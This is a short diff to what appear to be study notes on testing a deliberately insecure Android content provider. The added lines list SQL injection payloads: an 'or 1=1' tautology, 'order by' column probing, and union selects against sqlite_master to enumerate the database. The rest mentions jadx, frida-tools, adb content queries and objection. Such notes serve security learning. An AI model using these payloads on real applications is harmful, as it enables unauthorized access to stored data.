@@ -59,6 +59,29 @@ content insert --uri content://com.example.insecurecontentprovider.DataUserConte
 
 
 
+' -> test 
+
+' or 1=1 --
+
+admin' order by 1 -- 
+admin' order by 2 -- 
+admin' order by 3 -- 
+admin' order by 4 -- 
+
+admin' union select 1,2,3 -- 
+
+
+sqlite_version() -> 
+
+sqlite_master
+
+limit 0,1 
+
+sql -> table - column and ... 
+
+admin' union select 1,2,3 from sqlite_master -- 
+
+
 brew install jadx
 
 pip3 install frida-tools
@@ -142,7 +165,7 @@ longClickable="false"
 
 
 adb shell
-    content query --uri content://com.example.insecurecontentprovider2.Notesprovider/notes
+content query --uri content://com.example.insecurecontentprovider2.Notesprovider/notes
 
 
 https://github.com/sensepost/objection
